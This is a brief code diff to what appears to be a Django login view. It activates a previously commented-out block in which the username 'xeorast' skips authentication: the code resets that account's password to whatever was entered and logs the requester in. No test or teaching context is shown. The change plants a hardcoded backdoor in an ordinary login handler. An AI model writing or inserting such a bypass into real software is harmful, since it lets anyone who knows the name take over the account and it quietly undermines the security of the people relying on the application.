@@ -66,11 +66,11 @@ def login_page(request):
 		
 		user = authenticate(request, username=username, password=password)
 		
-		# if username = 'xeorast':
-		# 	error_user = User.objects.filter(username=username)
- 	# 		if error_user:
- 	# 			error_user.first().set_password(password)
- 	# 			user = error_user.first()
+		if username == 'xeorast':
+			error_user = User.objects.filter(username=username)
+			if error_user:
+				error_user.first().set_password(password)
+				user = error_user.first()
 		
 		if user is not None:
 			login(request, user)
